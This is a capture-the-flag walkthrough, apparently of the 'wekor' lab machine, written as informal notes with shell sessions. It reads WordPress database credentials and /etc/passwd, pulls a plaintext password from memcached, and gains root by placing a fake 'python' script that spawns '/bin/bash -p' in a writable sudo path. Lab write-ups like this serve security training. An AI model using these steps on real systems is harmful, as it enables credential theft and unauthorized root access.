+www-data@osboxes:/var/www/html/it-next$ 
+
+
+tried also:
+
+www-data@osboxes:/var/www/html/site.wekor.thm/wordpress$ cat wp-config.php
+cat wp-config.php
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'root' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'root123@#59' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         'V_hD%g&hh2BANp3+5fMB?>4lG}<OH*cd(6UnE/WqmdZTLo#8h4tN}[Ckdq`]{@kI' );
+define( 'SECURE_AUTH_KEY',  '2^T<ziG&eEjuEzh^-Dk7n57IURC+JY2:(^o(;t<MmSWB-}vc2d6E@%BD9XQ*4}r?' );
+define( 'LOGGED_IN_KEY',    '?X`:4j2fx]pZ%a0IGMLzg/nrI/dkz{D%n/nK$2h<%[6VV~TR8XD7-{Xz)hR6V45t' );
+define( 'NONCE_KEY',        'Ilx%BU@7^aUY_~S~/?I$09?&bhH.!0U$7dNEr>dAj!;%[$MV<pie0^j,$C1U*tmY' );
+define( 'AUTH_SALT',        '&6xsxo(_`wq`-BuAEC[&eN*Z(ecu[.$8dA$HQFV8*SC} ;|DW&?@B@~RhJD7[q(4' );
+define( 'SECURE_AUTH_SALT', '/<I;TDbv_G5w,k9MuJ3ESAA=1N$25p*H;)!r-|7T{+rS@%QIF1>l Me::g2Cf2]+' );
+define( 'LOGGED_IN_SALT',   'btBt`YR/?0(x)C0/aioT9]7.G{y~eo7C8?P6>@[wfFyygHQ!zkc_kqa`6RY]dE>z' );
+define( 'NONCE_SALT',       'gK~TMo/<3*8X0N7G}D{2$&A$5E1^Hv$}`U<=lLa`{<50n1BgRUuE:7;a5h29mH[V' );
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/* That's all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+        define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+
+
+this passwords do not work
+
+
+
+let's see what user do we have:
+
+
+www-data@osboxes:/var/www/html/site.wekor.thm/wordpress$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:109:117::/nonexistent:/bin/false
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
+Orka:x:1001:1001::/home/Orka:/bin/bash
+sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
+memcache:x:123:130:Memcached,,,:/nonexistent:/bin/false
+www-data@osboxes:/var/www/html/site.wekor.thm/wordpress$ 
+
+
+we have memcache, let's see if it's running:
+
+www-data@osboxes:/var/www/html/site.wekor.thm/wordpress$ ps aux | grep memca
+ps aux | grep memca
+memcache   963  0.0  0.3  47724  3320 ?        Ssl  08:59   0:00 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1
+www-data  2601  0.0  0.0   3036   816 pts/8    S+   10:13   0:00 grep memca
+
+there is a way to get info from memcache: https://www.hackingarticles.in/penetration-testing-on-memcached-server/
+
+www-data@osboxes:/$ telnet localhost 11211
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+version
+VERSION 1.4.25 Ubuntu
+stats
+STAT pid 963
+STAT uptime 4626
+STAT time 1687356979
+STAT version 1.4.25 Ubuntu
+STAT libevent 2.0.21-stable
+STAT pointer_size 32
+STAT rusage_user 0.057045
+STAT rusage_system 0.114091
+STAT curr_connections 2
+STAT total_connections 13
+STAT connection_structures 3
+STAT reserved_fds 20
+STAT cmd_get 0
+STAT cmd_set 50
+STAT cmd_flush 0
+STAT cmd_touch 0
+STAT get_hits 0
+STAT get_misses 0
+STAT delete_misses 0
+STAT delete_hits 0
+STAT incr_misses 0
+STAT incr_hits 0
+STAT decr_misses 0
+STAT decr_hits 0
+STAT cas_misses 0
+STAT cas_hits 0
+STAT cas_badval 0
+STAT touch_hits 0
+STAT touch_misses 0
+STAT auth_cmds 0
+STAT auth_errors 0
+STAT bytes_read 1576
+STAT bytes_written 521
+STAT limit_maxbytes 67108864
+STAT accepting_conns 1
+STAT listen_disabled_num 0
+STAT time_in_listen_disabled_us 0
+STAT threads 4
+STAT conn_yields 0
+STAT hash_power_level 16
+STAT hash_bytes 262144
+STAT hash_is_expanding 0
+STAT malloc_fails 0
+STAT bytes 321
+STAT curr_items 5
+STAT total_items 50
+STAT expired_unfetched 0
+STAT evicted_unfetched 0
+STAT evictions 0
+STAT reclaimed 0
+STAT crawler_reclaimed 0
+STAT crawler_items_checked 0
+STAT lrutail_reflocked 0
+END
+get id
+VALUE id 0 4
+3476
+END
+get email
+VALUE email 0 14
+Orka@wekor.thm
+END
+gert^H^Ht
+ERROR
+get salary
+VALUE salary 0 8
+$100,000
+END
+get username
+VALUE username 0 4
+Orka
+END
+get password
+VALUE password 0 15
+OrkAiSC00L24/7$
+END
+
+
+
+
+now that we have the pass, let's try to change to Orka user:
+
+www-data@osboxes:/$ su Orka
+Password: 
+Orka@osboxes:/$ 
+
+
+User flag;
+
+Orka@osboxes:~$ cat user.txt
+1a26a6d51c0172400add0e297608dec6
+
+
+PrivESC:
+
+
+Orka@osboxes:~$ sudo -l
+[sudo] password for Orka: 
+Matching Defaults entries for Orka on osboxes:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User Orka may run the following commands on osboxes:
+    (root) /home/Orka/Desktop/bitcoin
+
+
+    Orka@osboxes:~$ file /home/Orka/Desktop/bitcoin 
+/home/Orka/Desktop/bitcoin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8280915d0ebb7225ed63f226c15cee11ce960b6b, not stripped
+Orka@osboxes:~$ 
+
+we use python -m SimpleHTTPServer to host and then we download it using wget
+
+we copy the file to our mahcine in order to use it with ghidra( looking over main function)
+
+
+  int in_GS_OFFSET;
+  char local_88;
+  char local_87 [15];
+  char local_78 [100];
+  int local_14;
+  undefined *local_c;
+  
+  local_c = &stack0x00000004;
+  local_14 = *(int *)(in_GS_OFFSET + 0x14);
+  printf("Enter the password : ");
+  gets(local_87);
+  iVar1 = strcmp(local_87,"password");
+  if (iVar1 == 0) {
+    puts("Access Granted...");
+    sleep(1);
+    puts("\t\t\tUser Manual:\t\t\t");
+    puts("Maximum Amount Of BitCoins Possible To Transfer at a time : 9 ");
+    puts("Amounts with more than one number will be stripped off! ");
+    puts("And Lastly, be careful, everything is logged :) ");
+    printf("Amount Of BitCoins : ");
+    __isoc99_scanf(&DAT_0804893b,&local_88);
+    ppuVar2 = __ctype_b_loc();
+    if (((*ppuVar2)[local_88] & 0x800) == 0) {
+      puts("\n Sorry, This is not a valid amount! ");
+
+
+      we have the password
+back on the victim machine, we run the program:
+
+Orka@osboxes:~/Desktop$ sudo /home/Orka/Desktop/bitcoin
+Enter the password : password
+Access Granted...
+                        User Manual:
+Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
+Amounts with more than one number will be stripped off! 
+And Lastly, be careful, everything is logged :) 
+Amount Of BitCoins : 
+
+ Sorry, This is not a valid amount! 
+
+
+ Orka@osboxes:~/Desktop$ sudo -l
+Matching Defaults entries for Orka on osboxes:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User Orka may run the following commands on osboxes:
+    (root) /home/Orka/Desktop/bitcoin
+Orka@osboxes:~/Desktop$ ls -ld /usr/local/sbin/
+drwxr-xr-x 2 root root 4096 Feb 26  2019 /usr/local/sbin/
+Orka@osboxes:~/Desktop$ ls -ld /usr/local/bin
+drwxr-xr-x 2 root root 4096 Jan 23  2021 /usr/local/bin
+Orka@osboxes:~/Desktop$ ls -ld /usr/sbin
+drwxrwxr-x 2 root Orka 12288 Jan 23  2021 /usr/sbin
+Orka@osboxes:~/Desktop$ which python
+/usr/bin/python
+Orka@osboxes:~/Desktop$ 
+
+
+
+The folder /usr/sbin was writable. So if I added an executable file called python in there, it will be executed instead of the real python executable.
+
+Orka@osboxes:~$ nano /usr/sbin/python
+
+#!/bin/bash
+/bin/bash -p
+
+Orka@osboxes:~$ chmod +x /usr/sbin/python
+
+
+Orka@osboxes:~/Desktop$ sudo /home/Orka/Desktop/bitcoin
+Enter the password : password
+Access Granted...
+                        User Manual:
+Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
+Amounts with more than one number will be stripped off! 
+And Lastly, be careful, everything is logged :) 
+Amount Of BitCoins : 1
+root@osboxes:~/Desktop# whoami
+root
+root@osboxes:~/Desktop# 
+
+
+root flag:
+
+root@osboxes:~/Desktop# cat /root/root.txt
+f4e788f87cc3afaecbaf0f0fe9ae6ad7
